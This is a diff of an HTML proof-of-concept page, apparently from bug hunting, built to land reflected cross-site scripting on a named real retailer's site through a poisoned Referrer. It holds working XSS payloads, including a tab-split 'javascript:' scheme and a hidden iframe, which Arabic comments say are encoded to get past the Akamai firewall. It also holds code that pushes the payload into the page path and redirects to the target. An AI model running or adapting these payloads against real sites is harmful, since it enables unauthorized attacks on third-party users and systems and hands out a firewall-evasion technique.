@@ -3,30 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>PoC 10/10 - Mouad</title>
+    <title>PoC - Akamai Bypass</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+<body style="background:#111; color:#0f0; text-align:center; padding-top:50px; font-family:monospace;">
 
-    <h1 style="color:cyan;">VORTEX BYPASS: ENTITIES MODE</h1>
-    
-    <a id="attack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:cyan; color:black; font-weight:bold; text-decoration:none; border-radius:5px;">
-        START ATTACK (CLICK ME) 🚀
-    </a>
+    <h1>MOUAD VORTEX - XSS EXPLOIT</h1>
+    <hr style="border-color:#0f0;">
+
+    <div style="margin:20px; padding:20px; border:1px solid #0f0;">
+        <h3>Exploit 1: Manual (Confirmed)</h3>
+        <p>This uses the Tab bypass you just discovered.</p>
+        <a id="btn1" href="#" onclick="launchManual()" style="color:#000; background:#0f0; padding:10px; text-decoration:none; font-weight:bold;">LAUNCH MANUAL POC</a>
+    </div>
+
+    <div style="margin:20px; padding:20px; border:1px solid #0f0;">
+        <h3>Exploit 2: Automatic (Testing)</h3>
+        <p>Tries to trigger Alert automatically using Hidden iframe.</p>
+        <a id="btn2" href="#" onclick="launchAuto()" style="color:#000; background:#0f0; padding:10px; text-decoration:none; font-weight:bold;">LAUNCH AUTO POC</a>
+    </div>
 
     <script>
-        // هذا هو البايلود الذي أعطاك 10/10 في الكونسول
-        // جافاسكربت مشفرة لكي لا يراها الـ WAF في الطريق
-        var encodedJS = "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;";
-        
-        // بناء البايلود الكامل لكسر الـ href
-        var payload = "\"> <a href='" + encodedJS + "' style='font-size:40px;background:red;color:white;position:fixed;top:0;left:0;z-index:9999;'>CLICK_HERE_FOR_ALERT</a> <x=\"";
+        // الرابط المستهدف على نيوإيج
+        const targetUrl = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
 
-        // تشفير البايلود لضمان عدم حدوث Error 400
-        var finalPath = "/v/" + encodeURIComponent(payload);
+        // 1. البايلود اليدوي (الذي مر من Akamai)
+        function launchManual() {
+            var payload = "\"><a/href=\"j&#x09;avascript:alert('XSS_BY_MOUAD_10/10')\" style=\"font-size:50px;color:red;position:fixed;top:0;left:0;z-index:9999;background:yellow;\">CLICK_HERE_TO_WIN</a>";
+            updateAndGo(payload);
+        }
 
-        // تحديث الرابط في المتصفح قبل الانتقال
-        window.history.pushState({}, '', finalPath);
+        // 2. البايلود التلقائي (محاولة تجاوز Akamai بـ iframe)
+        function launchAuto() {
+            var payload = "\"><iframe/src=\"j&#x09;avascript:parent.alert(document.domain)\" style=\"display:none;\"></iframe>";
+            updateAndGo(payload);
+        }
+
+        function updateAndGo(p) {
+            // تغيير مسار الصفحة الحالية ليكون هو الـ Referrer المسموم
+            window.history.pushState({}, '', "/v/" + encodeURIComponent(p));
+            // الانتقال للهدف
+            setTimeout(function(){
+                window.location.href = targetUrl;
+            }, 500);
+        }
     </script>
+
 </body>
 </html>
